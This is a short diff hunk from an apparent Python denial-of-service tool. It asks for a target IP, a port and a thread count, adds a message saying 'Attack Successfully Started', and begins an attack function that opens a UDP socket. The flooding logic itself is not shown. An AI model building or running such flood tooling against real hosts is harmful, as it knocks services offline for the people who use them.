@@ -63,6 +63,7 @@ while True:
         ip = input("Target IP 🦧: ")
         port = int(input("Target Port: "))
         threads = int(input("Amount Of Threads: "))
+        print("Attack Successfully Started (☞ﾟヮﾟ)☞")
 
         def attack():
             attack = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
